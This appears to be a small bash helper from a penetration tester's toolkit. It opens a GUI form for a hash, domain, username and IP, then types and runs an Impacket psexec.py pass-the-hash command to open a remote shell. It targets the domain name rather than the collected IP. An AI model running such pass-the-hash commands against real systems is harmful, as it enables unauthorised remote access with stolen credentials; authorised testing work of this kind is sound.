#!/bin/bash

: '
Impacket: psexec.py get psexec shell 
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Hash" "Domain" "Username" "IP"

HASH=${form_data["Hash"]}
DOMAIN=${form_data["Domain"]}
USERNAME=${form_data["Username"]}
IP=${form_data["IP"]}

paste_command "psexec.py -hashes '${HASH}' '${DOMAIN}/${USERNAME}@${DOMAIN}'"
xdotool key Return
